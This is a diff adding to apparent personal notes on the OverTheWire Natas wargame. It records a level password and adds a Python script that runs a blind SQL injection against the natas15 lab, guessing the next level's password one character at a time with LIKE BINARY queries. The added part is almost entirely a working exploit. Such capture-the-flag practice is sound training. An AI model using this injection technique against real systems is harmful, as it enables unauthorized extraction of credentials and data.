@@ -140,3 +140,73 @@ Then upload:
 
 ==`natas15`== = SdqIqBsFcz3yotlNYErZSZwblkm0lrvx
 
+```
+import requests
+
+import re
+
+  
+
+characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+
+  
+
+username = "natas15"
+
+password = "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx"  # Your current level password
+
+  
+
+url = "http://natas15.natas.labs.overthewire.org"
+
+  
+
+session = requests.Session()
+
+current_password = []
+
+  
+
+while True:
+
+    for character in characters:
+
+        # Build the payload
+
+        test_password = "".join(current_password) + character
+
+        print(f"Trying: {test_password}")
+
+        # SQL injection payload - using LIKE for pattern matching
+
+        payload = f'natas16" AND password LIKE BINARY "{test_password}%" #'
+
+        # Send the request
+
+        response = session.post(url,
+
+                                data={"username": payload},
+
+                                auth=(username, password))
+
+        # Check response
+
+        if "This user exists." in response.text:
+
+            current_password.append(character)
+
+            print(f"[+] Found: {test_password}")
+
+            break
+
+    # Stop when we have 32 characters (typical Natas password length)
+
+    if len(current_password) == 32:
+
+        break
+
+  
+
+print(f"\n[+] Complete password for natas16: {''.join(current_password)}")
+```
+
